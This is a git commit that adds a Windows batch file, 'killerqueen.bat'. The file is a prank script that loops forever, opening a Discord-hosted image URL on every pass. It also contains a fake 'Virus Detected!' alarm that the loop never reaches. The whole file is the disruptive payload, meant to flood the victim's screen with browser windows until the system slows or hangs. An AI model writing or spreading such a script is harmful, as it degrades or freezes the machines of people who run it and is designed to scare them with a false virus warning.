78518c5edbbdde5356717e7a4417d9b6aa8f2d14
ben5446 <109690814+ben5446@users.noreply.github.com>
2023-01-01 19:08:22 -0500

    killer queen
    hayato

---
+++ killerqueen.bat
@@ -0,0 +1,7 @@
+@echo off
+CLS
+:A 
+start https://cdn.discordapp.com/attachments/851954124135464988/1058868438988230746/2B2D39EE-5B67-42F5-9537-6D280E6F2A7E.jpg
+goto A
+echo Fatal Error. Virus Detected!
+pause
